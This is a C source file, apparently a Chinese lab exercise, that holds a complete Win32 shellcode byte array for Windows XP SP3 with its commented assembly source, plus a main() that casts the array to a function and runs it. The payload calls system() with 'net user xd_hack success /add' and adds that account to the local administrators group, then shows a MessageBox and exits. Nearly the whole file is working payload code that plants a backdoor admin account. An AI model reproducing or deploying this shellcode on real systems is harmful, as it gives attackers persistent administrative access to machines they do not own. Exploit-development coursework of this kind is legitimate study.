//shellcode要求：
//　　（1）添加具有管理员权限用户(用户名：xd_hack, 密码：success)；
//　　（2）出现对话框， MessageBox(NULL,"Exploit success","Overflow",MB_OKCANCEL)      
//　　（3）添加成功后，能够退出线程，不致因溢出导致异常；ExitProcess(0);
//　　（4）运行平台:win32 XP sp3 中文;
#include <stdio.h>
#include <string.h>
 
char shellcode[]=
"\x55\x8b\xec\x33\xc0\x83\xec\x10"
"\xc6\x45\xf0\x6d\xc6\x45\xf1\x73"
"\xc6\x45\xf2\x76\xc6\x45\xf3\x63"
"\xc6\x45\xf4\x72\xc6\x45\xf5\x74"
"\x88\x45\xf6\xc6\x45\xf7\x75\xc6"
"\x45\xf8\x73\xc6\x45\xf9\x65\xc6"
"\x45\xfa\x72\xc6\x45\xfb\x33\xc6"
"\x45\xfc\x32\x88\x45\xfd\x8d\x45"
"\xf0\x50\xbb\x7b\x1d\x80\x7c\xff"
"\xd3\x8d\x45\xf7\x50\xff\xd3\x8b"
"\xe5\x33\xc0\x83\xec\x50\xc6\x45"
"\xb6\x6e\xc6\x45\xb7\x65\xc6\x45"
"\xb8\x74\xc6\x45\xb9\x20\xc6\x45"
"\xba\x75\xc6\x45\xbb\x73\xc6\x45"
"\xbc\x65\xc6\x45\xbd\x72\xc6\x45"
"\xbe\x20\xc6\x45\xbf\x78\xc6\x45"
"\xc0\x64\xc6\x45\xc1\x5f\xc6\x45"
"\xc2\x68\xc6\x45\xc3\x61\xc6\x45"
"\xc4\x63\xc6\x45\xc5\x6b\xc6\x45"
"\xc6\x20\xc6\x45\xc7\x73\xc6\x45"
"\xc8\x75\xc6\x45\xc9\x63\xc6\x45"
"\xca\x63\xc6\x45\xcb\x65\xc6\x45"
"\xcc\x73\xc6\x45\xcd\x73\xc6\x45"
"\xce\x20\xc6\x45\xcf\x2f\xc6\x45"
"\xd0\x61\xc6\x45\xd1\x64\xc6\x45"
"\xd2\x64\xc6\x45\xd3\x26\xc6\x45"
"\xd4\x6e\xc6\x45\xd5\x65\xc6\x45"
"\xd6\x74\xc6\x45\xd7\x20\xc6\x45"
"\xd8\x6c\xc6\x45\xd9\x6f\xc6\x45"
"\xda\x63\xc6\x45\xdb\x61\xc6\x45"
"\xdc\x6c\xc6\x45\xdd\x67\xc6\x45"
"\xde\x72\xc6\x45\xdf\x6f\xc6\x45"
"\xe0\x75\xc6\x45\xe1\x70\xc6\x45"
"\xe2\x20\xc6\x45\xe3\x61\xc6\x45"
"\xe4\x64\xc6\x45\xe5\x6d\xc6\x45"
"\xe6\x69\xc6\x45\xe7\x6e\xc6\x45"
"\xe8\x69\xc6\x45\xe9\x73\xc6\x45"
"\xea\x74\xc6\x45\xeb\x72\xc6\x45"
"\xec\x61\xc6\x45\xed\x74\xc6\x45"
"\xee\x6f\xc6\x45\xef\x72\xc6\x45"
"\xf0\x73\xc6\x45\xf1\x20\xc6\x45"
"\xf2\x78\xc6\x45\xf3\x64\xc6\x45"
"\xf4\x5f\xc6\x45\xf5\x68\xc6\x45"
"\xf6\x61\xc6\x45\xf7\x63\xc6\x45"
"\xf8\x6b\xc6\x45\xf9\x20\xc6\x45"
"\xfa\x2f\xc6\x45\xfb\x61\xc6\x45"
"\xfc\x64\xc6\x45\xfd\x64\x88\x45"
"\xfe\x8d\x45\xb6\x50\xb8\xc7\x93"
"\xbf\x77\xff\xd0\x8b\xe5\x33\xc9"
"\x83\xec\x24\xc6\x45\xdc\x45\xc6"
"\x45\xdd\x78\xc6\x45\xde\x70\xc6"
"\x45\xdf\x6c\xc6\x45\xe0\x6f\xc6"
"\x45\xe1\x69\xc6\x45\xe2\x74\xc6"
"\x45\xe3\x20\xc6\x45\xe4\x73\xc6"
"\x45\xe5\x75\xc6\x45\xe6\x63\xc6"
"\x45\xe7\x63\xc6\x45\xe8\x65\xc6"
"\x45\xe9\x73\xc6\x45\xea\x73\x88"
"\x4d\xeb\xc6\x45\xf1\x4f\xc6\x45"
"\xf2\x76\xc6\x45\xf3\x65\xc6\x45"
"\xf4\x72\xc6\x45\xf5\x66\xc6\x45"
"\xf6\x6c\xc6\x45\xf7\x6f\xc6\x45"
"\xf8\x77\x88\x4d\xf9\x8d\x75\xdc"
"\x8d\x7d\xf1\x66\x51\x57\x56\x66"
"\x51\xb8\xea\x07\xd5\x77\xff\xd0"
"\x51\xb8\xfa\xca\x81\x7c\xff\xd0"
"\x8b\xe5\x5d";

void main(){
 
	/*
	__asm{
 
		//LoadLibrary
		push ebp;
		mov ebp,esp;
		xor eax,eax;
		sub esp,10h ;
		mov byte ptr [ebp-10h],6Dh;	//m
		mov byte ptr [ebp-0fh],73h; //s
		mov byte ptr [ebp-0eh],76h;	//v
		mov byte ptr [ebp-0dh],63h;	//c
		mov byte ptr [ebp-0ch],72h;	//r  
		mov byte ptr [ebp-0bh],74h;	//t
		mov byte ptr [ebp-0ah],al;	//00
		mov byte ptr [ebp-09h],75h;	//u
        mov byte ptr [ebp-08h],73h;	//s
        mov byte ptr [ebp-07h],65h;	//e
        mov byte ptr [ebp-06h],72h;	//r
        mov byte ptr [ebp-05h],33h;	//3
        mov byte ptr [ebp-04h],32h;	//2
		mov byte ptr [ebp-03h],al;	//00
		//LoadLibrary("msvcrt.dll");
		lea eax,[ebp-10h];
		push eax;
		mov  ebx,0x7c801d7b;				//LoadLibraryA 0x76962804(win7) 0x7c801d7b(xp sp3)
		call ebx;
		//LoadLibrary("user32.dll");
		lea eax,[ebp-09h];
		push eax;
		call ebx;
		mov esp,ebp;
//		pop ebp;

//		push ebp;
//		mov ebp,esp;
		xor eax,eax;
		sub esp,50h ;
		mov byte ptr [ebp-4ah],6eh ; //n
		mov byte ptr [ebp-49h],65h ; //e
		mov byte ptr [ebp-48h],74h ; //t
		mov byte ptr [ebp-47h],20h ; 
		mov byte ptr [ebp-46h],75h ; //u
		mov byte ptr [ebp-45h],73h ; //s
		mov byte ptr [ebp-44h],65h ; //e
		mov byte ptr [ebp-43h],72h ; //r
		mov byte ptr [ebp-42h],20h ;
		mov byte ptr [ebp-41h],78h ; //x
		mov byte ptr [ebp-40h],64h ; //d
		mov byte ptr [ebp-3fh],5fh ; //_
		mov byte ptr [ebp-3eh],68h ; //h
		mov byte ptr [ebp-3dh],61h ; //a
		mov byte ptr [ebp-3ch],63h ; //c	
		mov byte ptr [ebp-3bh],6bh ; //k
		mov byte ptr [ebp-3ah],20h ; //
		mov byte ptr [ebp-39h],73h ; //s
		mov byte ptr [ebp-38h],75h ; //u
		mov byte ptr [ebp-37h],63h ; //c
		mov byte ptr [ebp-36h],63h ; //c
		mov byte ptr [ebp-35h],65h ; //e
		mov byte ptr [ebp-34h],73h ; //s
		mov byte ptr [ebp-33h],73h ; //s
		mov byte ptr [ebp-32h],20h ; //  
		mov byte ptr [ebp-31h],2fh ; ///
		mov byte ptr [ebp-30h],61h ; //a
		mov byte ptr [ebp-2fh],64h ; //d
		mov byte ptr [ebp-2eh],64h ; //d
		mov byte ptr [ebp-2dh],26h ; //&
		mov byte ptr [ebp-2ch],6eh ; //n
		mov byte ptr [ebp-2bh],65h ; //e
		mov byte ptr [ebp-2ah],74h ; //t
		mov byte ptr [ebp-29h],20h ; 
		mov byte ptr [ebp-28h],6ch ; //l
		mov byte ptr [ebp-27h],6fh ; //o
		mov byte ptr [ebp-26h],63h ; //c
		mov byte ptr [ebp-25h],61h ; //a
		mov byte ptr [ebp-24h],6ch ; //l
		mov byte ptr [ebp-23h],67h ; //g
		mov byte ptr [ebp-22h],72h ; //r
		mov byte ptr [ebp-21h],6fh ; //o
		mov byte ptr [ebp-20h],75h ; //u
		mov byte ptr [ebp-1fh],70h ; //p
		mov byte ptr [ebp-1eh],20h ;
		mov byte ptr [ebp-1dh],61h ; //a
		mov byte ptr [ebp-1ch],64h ; //d
		mov byte ptr [ebp-1bh],6dh ; //m
		mov byte ptr [ebp-1ah],69h ; //i
		mov byte ptr [ebp-19h],6eh ; //n
		mov byte ptr [ebp-18h],69h ; //i
		mov byte ptr [ebp-17h],73h ; //s
		mov byte ptr [ebp-16h],74h ; //t
		mov byte ptr [ebp-15h],72h ; //r
		mov byte ptr [ebp-14h],61h ; //a
		mov byte ptr [ebp-13h],74h ; //t
		mov byte ptr [ebp-12h],6fh ; //o
		mov byte ptr [ebp-11h],72h ; //r
		mov byte ptr [ebp-10h],73h ; //s
		mov byte ptr [ebp-0fh],20h ;
		mov byte ptr [ebp-0eh],78h ; //x
		mov byte ptr [ebp-0dh],64h ; //d
		mov byte ptr [ebp-0ch],5fh ; //_
		mov byte ptr [ebp-0bh],68h ; //h
		mov byte ptr [ebp-0ah],61h ; //a
		mov byte ptr [ebp-09h],63h ; //c	
		mov byte ptr [ebp-08h],6bh ; //k
		mov byte ptr [ebp-07h],20h ;
		mov byte ptr [ebp-06h],2fh ; ///
		mov byte ptr [ebp-05h],61h ; //a
		mov byte ptr [ebp-04h],64h ; //d
		mov byte ptr [ebp-03h],64h ; //d
		mov byte ptr [ebp-02h],al ;  //00
		//system("net user xd_hack success /add & net localgroup administrators xd_hack /add");
		lea eax,[ebp-4ah] ;
		push eax ;
		mov eax ,0x77bf93c7 ;		//system 0x75a3b177(win7) 0x77bf93c7(xp sp3)
		call eax;
		mov esp,ebp;
//		pop ebp;

//		push ebp;
//		mov ebp,esp;
		xor ecx,ecx;
		sub esp,24h;
		mov byte ptr[ebp-24h], 45h;	//E
		mov byte ptr[ebp-23h], 78h;	//x
		mov byte ptr[ebp-22h], 70h;	//p
		mov byte ptr[ebp-21h], 6ch;	//l
		mov byte ptr[ebp-20h], 6fh;	//o
		mov byte ptr[ebp-1fh], 69h;	//i
		mov byte ptr[ebp-1eh], 74h;	//t
		mov byte ptr[ebp-1dh], 20h;	//
		mov byte ptr[ebp-1ch], 73h;	//s
		mov byte ptr[ebp-1bh], 75h;	//u
		mov byte ptr[ebp-1ah], 63h;	//c
		mov byte ptr[ebp-19h], 63h;	//c
		mov byte ptr[ebp-18h], 65h;	//e
		mov byte ptr[ebp-17h], 73h;	//s
		mov byte ptr[ebp-16h], 73h;	//s
		mov byte ptr[ebp-15h], cl;	//00
		mov byte ptr[ebp-0fh], 4fh;	//O
		mov byte ptr[ebp-0eh], 76h;	//v
		mov byte ptr[ebp-0dh], 65h;	//e
		mov byte ptr[ebp-0ch], 72h;	//r
		mov byte ptr[ebp-0bh], 66h;	//f
		mov byte ptr[ebp-0ah], 6ch;	//l
		mov byte ptr[ebp-09h], 6fh;	//o
		mov byte ptr[ebp-08h], 77h;	//w
		mov byte ptr[ebp-07h], cl;	//00
		//MessageBox(NULL,"Exploit success","Overflow",MB_OKCANCEL)
		lea esi , [ebp-24h];
		lea edi , [ebp-0fh];
		push cx;
		push edi;
		push esi;
		push cx;
		mov eax,0x77d507ea;			//MessageBoxA 0x7596ea71(win7)  0x77d507ea(xp sp3)
		call eax;
		//ExitProcess(0);
		push ecx;
		mov eax, 0x7c81cafa			//ExitProcess 0x76962a6f(win7) 0x7c81cafa(xp sp3)
		call eax

		mov esp,ebp;
		pop ebp;
}
*/
   int (*func)();
   func = (int (*)()) &shellcode;
   printf("Shellcode Length is : %d",strlen((char *)shellcode));
   (int)(*func)();   
    
}
 